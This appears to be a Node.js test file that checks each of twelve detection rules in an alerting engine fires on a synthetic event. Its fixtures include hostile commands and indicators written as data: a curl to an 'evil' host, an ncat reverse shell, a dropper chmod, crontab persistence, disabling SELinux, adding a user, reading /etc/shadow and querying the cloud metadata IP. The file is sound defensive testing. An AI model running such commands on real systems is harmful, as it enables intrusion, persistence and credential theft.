'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('path');
const { loadRulesFromYamlJson, evaluateAlerts } = require('../../services/alerting/src/rule-engine');

const RULES_PATH = path.join(__dirname, '../../config/observability/alert-rules.yaml');

test('All alert rules can be matched by synthetic events', () => {
  const rules = loadRulesFromYamlJson(RULES_PATH);
  assert.equal(rules.length >= 12, true);

  const fixtures = {
    'ALERT-001': { session_id: 's-a', command: 'curl https://evil' },
    'ALERT-002': { session_id: 's-a', command: 'ncat -e /bin/sh 1.1.1.1 4444' },
    'ALERT-003': { session_id: 's-a', command: 'python3 -c "import base64;print(base64.b64decode(x))"' },
    'ALERT-004': { session_id: 's-a', dst_port: 4444 },
    'ALERT-005': { session_id: 's-a', command: 'chmod +x /tmp/dropper' },
    'ALERT-006': { session_id: 's-a', proc_spawn_rate: 34 },
    'ALERT-007': { session_id: 's-a', dns_query: 'hiddenservice.onion' },
    'ALERT-008': { session_id: 's-a', command: 'crontab -e' },
    'ALERT-009': { session_id: 's-a', command: 'setenforce 0' },
    'ALERT-010': { session_id: 's-a', command: 'useradd pwn' },
    'ALERT-011': { session_id: 's-a', path: '/etc/shadow' },
    'ALERT-012': { session_id: 's-a', dst_ip: '169.254.169.254' },
  };

  for (const [ruleId, evt] of Object.entries(fixtures)) {
    const alerts = evaluateAlerts(evt, rules);
    assert.ok(alerts.some((a) => a.rule_id === ruleId), `expected rule ${ruleId} to fire`);
    const got = alerts.find((a) => a.rule_id === ruleId);
    assert.equal(got.type, 'alert_event');
    assert.equal(got.session_id, 's-a');
    assert.ok(got.severity);
  }
});
